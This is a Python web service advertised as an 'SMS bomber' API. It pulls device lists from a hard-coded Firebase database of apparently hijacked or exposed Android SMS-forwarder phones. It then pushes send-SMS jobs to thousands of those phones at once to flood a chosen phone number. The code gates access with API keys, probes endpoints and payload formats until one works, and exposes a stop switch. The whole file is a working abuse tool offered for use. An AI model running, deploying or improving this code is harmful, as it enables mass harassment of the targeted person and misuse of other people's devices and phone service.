#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v9.0 — HYPER FLASH         ║
║   ▸ API Key Protected                                   ║
║   ▸ 3000+ Devices | 4000+ Concurrent                    ║
║   ▸ Full Unicode / Emoji / Hindi / Symbols Support      ║
║   ▸ Multi-Endpoint + Multi-Format Smart Fallback        ║
║   ▸ /stop endpoint (instant local cancel)               ║
║   ▸ /debug + /devices + /health endpoints               ║
║   ▸ Render + Vercel + UptimeRobot Ready                 ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
import json
import aiohttp
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-ox",
}

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — YAHAN APNE URLs DAALO
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS_RAW = [
    "https://total-ocean-469810-i8-default-rtdb.firebaseio.com",
    
]

# ─── Auto dedupe + clean ───────────────────────────────────
_seen = set()
_cleaned = []
for u in FIREBASE_URLS_RAW:
    u = u.strip().rstrip("/")
    if u.endswith(".json"):
        u = u[:-5]
    if u and u not in _seen:
        _seen.add(u)
        _cleaned.append(u)
FIREBASE_URLS = _cleaned

# ═══════════════════════════════════════════════════════════
# 🎯 SEND ENDPOINTS — ordered by success probability
# ═══════════════════════════════════════════════════════════
SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/webhookEvent/send.json",
    "clients/{id}/webhookEvent.json",
    "clients/{id}/sendSms.json",
    "clients/{id}/sms.json",
    "clients/{id}/send.json",
    "clients/{id}/message.json",
    "sendSms/{id}.json",
    "sms/{id}.json",
    "send/{id}.json",
    "clients/{id}/messages.json",
    "clients/{id}/inbox.json",
]

# ═══════════════════════════════════════════════════════════
# 📦 PAYLOAD FORMATS — ordered by most common first
# ═══════════════════════════════════════════════════════════
def build_payloads(target: str, message: str):
    ts = int(time.time() * 1000)
    return [
        # Format 1 — Standard Android SMS forwarder
        {"from": 1, "to": target, "message": message,
         "isSended": False, "timestamp": ts},
        # Format 2 — Full combo (works on most devices)
        {"from": 1, "to": target, "phone": target, "number": target,
         "message": message, "msg": message, "text": message,
         "body": message, "isSended": False, "status": False,
         "timestamp": ts},
        # Format 3 — phone-style
        {"phone": target, "message": message,
         "isSended": False, "timestamp": ts},
        # Format 4 — push-style
        {"to": target, "body": message, "title": "",
         "isSended": False, "timestamp": ts},
        # Format 5 — minimal
        {"to": target, "msg": message},
    ]


# ═══════════════════════════════════════════════════════════
# ⚙️ TUNED SETTINGS — for 3000+ devices
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 4000
BATCH_CHUNK = 500           # smaller chunks for responsiveness
REQUEST_TIMEOUT = 6
CONNECT_TIMEOUT = 2
DEVICE_CACHE_TTL = 25

API_NAME = "@BRONX_ULTRA"
API_VERSION = "9.0"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title=f"🔥 {API_NAME} BOMBER API",
    version=API_VERSION,
    description="Hyper Firebase Bomber — 3000+ devices, 4000+ concurrent",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

_LOCAL_STOP = set()
_DEVICE_CACHE = {"devices": None, "ts": 0}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    if not api_key:
        return False
    return api_key.strip() in VALID_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key.strip()
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key.strip()
    key = body_data.get("key") or body_data.get("api_key")
    if key:
        return str(key).strip()
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


def fix_message(raw_message, is_get: bool) -> str:
    """Preserve full Unicode / emoji / Hindi / symbols."""
    if raw_message is None:
        return ""
    if not isinstance(raw_message, str):
        raw_message = str(raw_message)
    msg = raw_message
    # GET: '+' becomes space (standard URL decode)
    if is_get:
        msg = msg.replace("+", " ")
    # Handle escaped chars
    msg = msg.replace("\\n", "\n").replace("\\t", "\t")
    msg = msg.replace("\\r", "\r").replace("\\\\", "\\")
    return msg.strip()


# ═══════════════════════════════════════════════════════════
# 📡 FETCH DEVICES
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            devices = []
            for k, v in data.items():
                if not isinstance(v, dict):
                    continue
                status = v.get("status", True)
                if status is True or status == "true" or status is None:
                    devices.append({"id": k, "url": base})
            return devices
    except Exception:
        return []


async def get_all_devices(session, use_cache=False):
    if use_cache:
        age = time.time() - _DEVICE_CACHE["ts"]
        cached = _DEVICE_CACHE["devices"]
        if cached is not None and age < DEVICE_CACHE_TTL:
            return cached

    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)

    _DEVICE_CACHE["devices"] = out
    _DEVICE_CACHE["ts"] = time.time()
    return out


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE — Smart fallback strategy
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payloads = build_payloads(target, message)
        base_url = device["url"]
        dev_id = device["id"]

        for ep_idx, ep in enumerate(SEND_ENDPOINTS):
            url = f"{base_url}/{ep.format(id=dev_id)}"

            # First endpoint: try ALL payloads × PUT/POST
            # Later endpoints: try only 2 payloads (fast fallback)
            payload_range = range(len(payloads)) if ep_idx == 0 else range(2)

            for p_idx in payload_range:
                payload = payloads[p_idx]

                for method in ("PUT", "POST"):
                    try:
                        if method == "PUT":
                            async with session.put(url, json=payload) as r:
                                if r.status in (200, 201):
                                    stats["success"] += 1
                                    return True
                                if r.status == 404:
                                    break  # wrong endpoint, skip
                                if r.status == 401:
                                    stats["blocked"] += 1
                                    return False  # auth — stop this device
                        else:
                            async with session.post(url, json=payload) as r:
                                if r.status in (200, 201):
                                    stats["success"] += 1
                                    return True
                                if r.status == 404:
                                    break
                                if r.status == 401:
                                    stats["blocked"] += 1
                                    return False
                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        continue

        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    return number in _LOCAL_STOP


# ═══════════════════════════════════════════════════════════
# 💣 WORKER
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    _LOCAL_STOP.discard(number)

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=600,
        force_close=False,
        enable_cleanup_closed=True,
        use_dns_cache=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT,
        sock_read=REQUEST_TIMEOUT,
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=True)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            return

        ndev = len(devices)
        total = ndev * count

        print(f"\n{'='*60}")
        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — HYPER FLASH")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Devices    : {ndev}")
        print(f"[{jid}] Per-device : {count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*60}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}

        all_tasks = []
        for device in devices:
            for _ in range(count):
                all_tasks.append(
                    send_one(session, device, number, message, sem, stats)
                )

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests...")

        completed = 0
        cancelled = False
        for i in range(0, total_tasks, BATCH_CHUNK):
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                cancelled = True
                for t in all_tasks[i:]:
                    t.cancel()
                break

            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)

            elapsed_sf = time.time() - t0
            speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                  f"FAIL={stats['failed']} | "
                  f"{elapsed_sf:.1f}s | {speed_sf}/s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
        print(f"{'='*60}\n")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "protected": True,
        "firebases_loaded": len(FIREBASE_URLS),
        "mode": "HYPER FLASH",
        "max_concurrent": MAX_CONCURRENT,
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
            "devices": "/devices?key=YOUR_KEY",
            "debug": "/debug?key=YOUR_KEY",
        },
    }


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "api": API_NAME,
        "version": API_VERSION,
        "time": datetime.now().isoformat(),
    }


@app.get("/keys")
async def keys_info():
    return {
        "api": API_NAME,
        "total_keys": len(VALID_KEYS),
        "hint": "Contact admin for a valid key",
    }


# ═══════════════════════════════════════════════════════════
# 🚀 /send
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"
    query_data = dict(request.query_params)

    body_data = {}
    if not is_get:
        try:
            body_data = await request.json()
        except Exception:
            try:
                form = await request.form()
                body_data = dict(form)
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 API key required"},
            status_code=401,
        )
    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "❌ Invalid API key"},
            status_code=401,
        )

    raw_message = merged.get("message") or merged.get("msg") or ""
    message = fix_message(raw_message, is_get)

    number = merged.get("number") or merged.get("num") or merged.get("numer") or ""
    number = str(number).strip()

    count_str = merged.get("count", "1")

    if not message:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing message"}, 400
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing number"}, 400
        )

    clean_number = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean_number.isdigit() or len(clean_number) < 10:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Invalid number"}, 400
        )

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
        if count > 500:
            count = 500  # safety cap
    except Exception:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "invalid count"}, 400
        )

    bg.add_task(bomb_worker, clean_number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "target": clean_number,
        "message_sent": message,
        "message_length": len(message),
        "per_device": count,
        "mode": "HYPER FLASH FAN-OUT (multi-format smart)",
        "stop_url": f"/stop?key={api_key}&number={clean_number}",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request,
    number: str = Query(None),
    key: str = Query(None),
):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "number required"}, 400
        )

    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _LOCAL_STOP.add(number)

    return {
        "success": True,
        "api": API_NAME,
        "message": f"🛑 Stop signal sent for {number}",
        "number": number,
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout
    ) as session:
        devices = await get_all_devices(session, use_cache=False)

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices_sample": devices[:10],
    }


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "success": True,
        "total": len(FIREBASE_URLS),
        "note": "🔒 Firebase URLs are hidden",
    }


# ═══════════════════════════════════════════════════════════
# 🔬 /debug
# ═══════════════════════════════════════════════════════════
@app.get("/debug")
async def debug_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "error": "🔑 Valid key required"}, 401
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=20, connect=5)
    headers = {"Content-Type": "application/json"}

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=False)

        if not devices:
            return {"success": False, "error": "No devices online"}

        test_dev = devices[0]
        target = "9876543210"
        message = "debug test 🚀"

        struct_url = f"{test_dev['url']}/clients/{test_dev['id']}.json"
        device_struct = None
        try:
            async with session.get(struct_url) as r:
                device_struct = await r.json(content_type=None)
        except Exception as e:
            device_struct = {"error": str(e)}

        payloads = build_payloads(target, message)
        results = []

        for ep in SEND_ENDPOINTS:
            url = f"{test_dev['url']}/{ep.format(id=test_dev['id'])}"
            ep_result = {"endpoint": ep, "tries": []}

            for idx, payload in enumerate(payloads):
                for method in ("PUT", "POST"):
                    try:
                        if method == "PUT":
                            async with session.put(url, json=payload) as r:
                                status = r.status
                                body = (await r.text())[:150]
                        else:
                            async with session.post(url, json=payload) as r:
                                status = r.status
                                body = (await r.text())[:150]

                        ep_result["tries"].append({
                            "method": method,
                            "payload_fmt": idx + 1,
                            "status": status,
                            "body": body,
                        })

                        if status in (200, 201):
                            ep_result["WORKING"] = {
                                "method": method,
                                "payload_fmt": idx + 1,
                                "payload": payload,
                            }
                            break
                    except Exception as e:
                        ep_result["tries"].append({
                            "method": method,
                            "payload_fmt": idx + 1,
                            "error": str(e)[:80],
                        })
                if "WORKING" in ep_result:
                    break

            results.append(ep_result)
            if "WORKING" in ep_result:
                break

        return {
            "success": True,
            "total_devices": len(devices),
            "test_device_id": test_dev["id"],
            "test_device_url": test_dev["url"],
            "device_structure": device_struct,
            "endpoint_results": results,
            "verdict": "✅ FOUND WORKING ENDPOINT" if any(
                "WORKING" in r for r in results
            ) else "❌ NO WORKING ENDPOINT — check device structure",
        }
